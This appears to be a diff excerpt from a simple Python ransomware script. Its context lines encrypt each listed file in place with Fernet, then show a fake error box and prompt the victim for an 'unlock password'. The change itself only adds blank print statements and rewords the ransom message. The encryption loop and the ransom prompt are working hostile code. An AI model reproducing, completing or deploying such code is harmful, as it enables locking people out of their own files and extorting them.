@@ -29,13 +29,30 @@ for file in files:
 	contents_encrypted = Fernet(secretkey).encrypt(contents)
 	with open(file, "wb") as thefile:
 		thefile.write(contents_encrypted)
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
+print(" ")
 
 # Password to run the script. DO NOT USE THIS AS THE DECRIPT PASSWORD
 password = "pASS?0wRd"
 userInput = input("OH NO!!! check your files\n")
 time.sleep(2.5)
 print("Enter Unlock Password")
-ctypes.windll.user32.MessageBoxW(0, "OHNO! Cheak your files", "ERROR", 16)
+ctypes.windll.user32.MessageBoxW(0, "Check your files", "ERROR", 16)
 
 # Checking the password that the user put in, if its right the user will get a message saying the files are decrypted 
 # and if its wrong a message saying that the password is wrong
